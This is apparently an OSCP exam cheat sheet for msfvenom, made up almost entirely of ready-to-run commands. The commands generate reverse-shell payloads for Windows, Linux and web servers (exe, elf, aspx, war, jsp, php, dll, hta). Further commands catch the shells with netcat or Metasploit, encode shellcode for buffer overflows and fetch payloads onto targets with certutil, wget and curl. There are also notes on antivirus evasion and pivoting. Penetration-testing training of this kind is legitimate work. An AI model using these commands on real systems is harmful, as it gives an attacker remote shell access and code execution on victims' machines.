# msfvenom Cheat Sheet (OSCP)

Payload generation reference. Set these once and reuse:

```bash
LHOST=192.168.49.101      # your Kali VPN IP (tun0) — verify with: ip a show tun0
LPORT=443                 # a port likely allowed outbound (443/80/8080 beat random high ports)
```

**Two payload families — know which you're making:**
- `shell_reverse_tcp` = **staged? no — inline (single stage)**. Self-contained, no
  Metasploit handler needed; catch with plain `nc`. Preferred on the exam.
- `meterpreter/...` = needs the matching `multi/handler` in msfconsole. More features,
  but you must catch it with Metasploit, and OSCP limits Metasploit use to ONE machine.

**Staged (`/`) vs inline (`_`) in the payload name:**
- `windows/x64/shell/reverse_tcp`  -> staged  (needs a handler; two `/`-separated stages)
- `windows/x64/shell_reverse_tcp`  -> inline  (nc-catchable)  <-- default choice

---

## Windows reverse shells

```bash
# inline, nc-catchable (exe)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe

# 32-bit target
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell32.exe

# meterpreter (needs multi/handler)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o met.exe

# service exe (for sc.exe / unquoted service path / service replacement)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe-service -o svc.exe

# raw PowerShell one-liner payload (paste into a PS reverse shell context)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f psh -o shell.ps1

# base64 powershell (for -e / -enc, e.g. via xp_cmdshell)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f psh-cmd -o shell.txt
```

## Web-app upload payloads (the exam foothold path)

```bash
# ASPX (IIS / .NET) — for aspx upload or the .ashx handler trick
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx

# WAR (Tomcat manager deploy)
msfvenom -p java/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.jsp

# PHP (append a <?php tag if the app needs it; msfvenom's raw php sometimes needs it)
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
# common fix: prepend the opening tag
(echo '<?php'; cat shell.php) > s.php && mv s.php shell.php

# ASP (classic)
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o shell.asp
```

## Linux reverse shells

```bash
# ELF, inline, nc-catchable
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf

# 32-bit
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell32.elf

# meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o met.elf
```

## Other formats

```bash
# raw shellcode (for buffer-overflow / custom loaders) — C array
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f c -o sc.c
# python / bash / dll / macho / hta-psh / vba
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o shell.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o shell.hta
```

---

## Catching the shell

```bash
# inline shell_reverse_tcp -> plain listener
nc -lvnp $LPORT
# nicer: rlwrap for arrow-key history
rlwrap nc -lvnp $LPORT

# meterpreter / staged -> Metasploit handler (must match payload exactly)
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run -j"
```

---

## Key flags

```
-p   payload
-f   output format (exe, elf, aspx, war, raw, psh, c, dll, hta-psh, ...)
-o   output file
-e   encoder            (e.g. -e x86/shikata_ga_nai)
-i   encode iterations  (e.g. -i 5)
-b   bad chars to avoid (e.g. -b '\x00\x0a\x0d')   <-- critical for buffer overflows
-a   architecture       (x86 / x64)
--platform              (windows / linux / ...)
-n   NOP sled length
-v   custom shellcode variable name (with -f c/python)
--smallest              smallest possible payload
list payloads:   msfvenom -l payloads | grep <keyword>
list formats:    msfvenom --list formats
list encoders:   msfvenom -l encoders
```

## Encoding / bad chars (buffer overflow context)

```bash
# avoid null/CR/LF, encode with shikata, 5 iterations, C output
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -i 5 -f c -v shellcode
# NOTE: encoding is for BAD-CHAR avoidance, NOT reliable AV evasion. Modern Defender
# eats shikata-encoded msf payloads. For AV, prefer non-msf shells or manual methods.
```

---

## Delivery (staging + pulling onto the target)

```bash
# host the payload on Kali
python3 -m http.server 8000                # or: 80
```
```powershell
# Windows target — pull it
iwr -Uri http://192.168.49.101:8000/shell.exe -OutFile shell.exe        # PS
certutil -urlcache -f http://192.168.49.101:8000/shell.exe shell.exe    # cmd
```
```bash
# Linux target — pull it
wget http://192.168.49.101:8000/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf
curl http://192.168.49.101:8000/shell.elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf
```

Through a ligolo pivot (target can't reach Kali directly): add a listener on the pivot
that relays 8000 and the LPORT back to Kali, and point the payload's LHOST at the
**pivot's internal IP**, not your Kali.

---

## Exam reminders

- Prefer **inline `shell_reverse_tcp` + nc** — no Metasploit dependency, and OSCP
  restricts Metasploit to a single machine. Save meterpreter for that one box.
- **Match architecture** (`x64` vs `x86`) to the target, or the payload silently fails.
- **LHOST must be your tun0 VPN IP**, never eth0/localhost. Double-check it every time.
- **Pick a sane LPORT** — 443/80 get through egress filters that block random high ports.
- msfvenom encoding is **not** AV bypass. If Defender eats it, switch to a manual
  PowerShell reverse shell or a non-msf technique.
- Test the listener is up **before** you trigger the payload.
```
